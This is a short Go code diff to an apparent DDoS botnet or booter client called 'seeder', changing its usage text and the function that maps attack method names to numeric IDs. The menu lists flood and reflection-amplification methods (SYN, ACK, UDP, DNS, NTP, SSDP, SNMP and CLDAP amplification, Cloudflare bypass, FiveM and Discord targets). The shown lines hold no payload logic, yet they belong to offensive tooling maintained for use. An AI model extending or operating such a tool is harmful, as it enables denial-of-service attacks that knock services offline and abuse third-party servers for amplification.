@@ -37,7 +37,7 @@ func main() {
 	fmt.Println("Usage:")
 	fmt.Println("  seeder <method> <target> <duration>")
 	fmt.Println("")
-	fmt.Println("Methods: axis-l7, tlsplus, tls, cf, udp, pps, game, discord,")
+	fmt.Println("Methods: axis-l7, http, tls, cf, udp, vse, fivem, discord,")
 	fmt.Println("         syn, ack, fin, rst, tcpconn, xmas, null, window,")
 	fmt.Println("         dns-amp, ntp-amp, ssdp-amp, snmp-amp, cldap-amp,")
 	fmt.Println("         icmp, greip, greeth")
@@ -180,7 +180,7 @@ func getAttackID(method string) uint8 {
 		return 3
 	case "tls":
 		return 4
-	case "tlsplus", "tls+":
+	case "http":
 		return 5
 	case "cf":
 		return 6
